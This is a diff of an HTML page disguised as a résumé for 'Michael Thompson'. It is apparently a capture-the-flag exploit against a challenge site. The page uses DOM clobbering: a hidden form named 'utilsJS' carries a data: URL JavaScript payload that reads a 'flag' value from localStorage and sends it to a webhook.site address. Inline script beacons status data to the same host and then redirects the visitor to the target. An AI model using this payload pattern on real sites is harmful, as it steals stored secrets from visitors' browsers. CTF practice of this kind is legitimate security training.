@@ -3,6 +3,9 @@
      <head>
          <title>Michael Thompson - Senior Software Engineer</title>
          <meta charset="UTF-8">
+         <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+         <meta http-equiv="Pragma" content="no-cache">
+         <meta http-equiv="Expires" content="0">
          <style>
              body { font-family: Arial, sans-serif; margin: 0; padding: 40px; background: #f4f4f4; }
              .resume { max-width: 800px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; }
@@ -13,13 +16,12 @@
          </style>
      </head>
      <body>
-         <!-- CRITICAL: Use data URL for CSP bypass -->
+         <!-- CRITICAL: Cache-busting DOM clobbering with compact data URL -->
          <form id="utilsJS">
-             <input name="url" value="data:text/javascript,function sendWebhook(s,d){try{const i=new 
-     Image();i.src='https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/'+s+'?flag='+(d||'none')+'&domain='+window.locat
-     ion.hostname+'&ts='+Date.now();document.body.appendChild(i);}catch(e){}}try{const 
-     f=localStorage.getItem('flag');sendWebhook('LIVE-FLAG',f);if(f){sendWebhook('FLAG-CONFIRM',f);console.log('FLAG:',f);}}ca
-     tch(e){sendWebhook('ERROR',e.message);}">
+             <input name="url" value="data:text/javascript,try{const f=localStorage.getItem('flag');const i=new 
+     Image();i.src='https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/FINAL-FLAG?flag='+(f||'NOT_FOUND')+'&d='+locatio
+     n.hostname+'&t='+Date.now();document.body.appendChild(i);}catch(e){const i=new Image();i.src='https://webhook.site/ae6ba4
+     ff-a1b4-453d-804e-052d59fabf4a/ERROR?e='+e.message;document.body.appendChild(i);}">
          </form>
 
          <div class="resume">
@@ -52,7 +54,7 @@
          </div>
 
          <script>
-             console.log('CSP COMPLIANT DATA URL APPROACH');
+             console.log('CACHE-BUSTING FINAL ATTEMPT - ' + Date.now());
 
              function sendWebhook(data) {
                  try {
@@ -61,54 +63,33 @@
                      Object.keys(data).forEach(key => {
                          params.append(key, typeof data[key] === 'object' ? JSON.stringify(data[key]) : data[key]);
                      });
-                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/csp-final?' + params.toString();
+                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/cache-bust?' + params.toString();
                      document.body.appendChild(img);
                  } catch(e) {}
              }
 
-             // Send confirmation
              sendWebhook({
-                 status: 'CSP_COMPLIANT_SETUP',
+                 status: 'CACHE_BUST_FINAL_START',
                  timestamp: new Date().toISOString(),
+                 cache_buster: Date.now(),
                  domain: window.location.hostname,
+                 utilsJS_exists: !!document.getElementById('utilsJS'),
                  utilsJS_ready: !!window.utilsJS && !!window.utilsJS.url,
-                 data_url_length: window.utilsJS?.url?.value?.length || 0,
-                 is_data_url: window.utilsJS?.url?.value?.startsWith('data:') || false
+                 utilsJS_url_value: window.utilsJS?.url?.value || 'NOT_FOUND',
+                 url_is_data: window.utilsJS?.url?.value?.startsWith('data:') || false,
+                 url_length: window.utilsJS?.url?.value?.length || 0
              });
 
-             // Test the data URL payload execution
-             setTimeout(() => {
-                 try {
-                     let utilJS = window.utilsJS || {};
-                     let script = document.createElement('script');
-                     script.src = utilJS.url;
-                     document.body.appendChild(script);
-
-                     sendWebhook({
-                         status: 'DATA_URL_PAYLOAD_EXECUTED',
-                         timestamp: new Date().toISOString(),
-                         script_src_preview: script.src.substring(0, 100) + '...',
-                         success: true
-                     });
-                 } catch(e) {
-                     sendWebhook({
-                         status: 'DATA_URL_EXECUTION_ERROR',
-                         error: e.message,
-                         timestamp: new Date().toISOString()
-                     });
-                 }
-             }, 1000);
-
-             // Navigate to CTF after confirming data URL is ready
+             // Navigate to CTF immediately
              setTimeout(() => {
                  sendWebhook({
-                     status: 'NAVIGATING_TO_CTF_WITH_DATA_URL',
+                     status: 'NAVIGATING_TO_LIVE_CTF_FINAL',
                      timestamp: new Date().toISOString(),
                      target: 'https://jobclobbering-d61fba936086d20d.chal.secjhu.club/#messages'
                  });
 
                  window.location.replace('https://jobclobbering-d61fba936086d20d.chal.secjhu.club/#messages');
-             }, 2000);
+             }, 1000);
          </script>
      </body>
      </html>
